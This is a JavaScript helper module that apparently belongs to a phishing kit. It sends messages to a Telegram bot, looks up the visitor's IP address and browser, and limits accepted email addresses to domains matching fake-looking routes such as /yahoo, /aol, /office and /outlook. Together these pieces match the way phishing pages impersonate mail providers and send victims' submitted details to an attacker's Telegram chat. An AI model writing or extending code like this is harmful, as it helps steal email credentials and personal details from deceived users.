const sendMessageToTelegram = async (message) => {
  const botToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
  const chatId = process.env.REACT_APP_TELEGRAM_CHAT_ID;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });
    const data = await response.json();
    console.log("Success:", data);
  } catch (error) {
    console.error("Error:", error);
  }
};

// Export the function to be used in components
export { sendMessageToTelegram };

// Function to get the user's IP address
export const getUserIP = () => {
  return fetch("https://api64.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => data.ip || "Unknown")
    .catch((error) => {
      console.error("Error retrieving IP address:", error);
      return "Unknown";
    });
};

// Function to get the user's browser information
export const getUserBrowser = () => {
  const userAgent = navigator.userAgent;
  if (userAgent.includes("Chrome") && !userAgent.includes("Edg"))
    return "Google Chrome";
  if (userAgent.includes("Firefox")) return "Mozilla Firefox";
  if (userAgent.includes("Safari") && !userAgent.includes("Chrome"))
    return "Apple Safari";
  if (userAgent.includes("Edg")) return "Microsoft Edge";
  if (userAgent.includes("Trident") || userAgent.includes("MSIE"))
    return "Internet Explorer";
  return `Unknown Browser: ${userAgent}`;
};

export const validateEmailForRoute = (path, email) => {
  const domain = email.split("@")[1]; // Extract the domain from the email
  if (!domain) return false; // Invalid email if no domain part

  switch (path) {
    case "/yahoo":
      return domain === "yahoo.com";
    case "/aol":
      return domain === "aol.com" || domain === "yahoo.com";
    case "/office":
    case "/outlook":
      // Returns true if the domain is not one of the explicitly invalid ones.
      // This allows all custom domains to be valid.
      return !["yahoo.com", "gmail.com", "aol.com", "mail.com"].includes(
        domain
      );
    default:
      return false; // Optionally handle other paths or set a default validation rule
  }
};
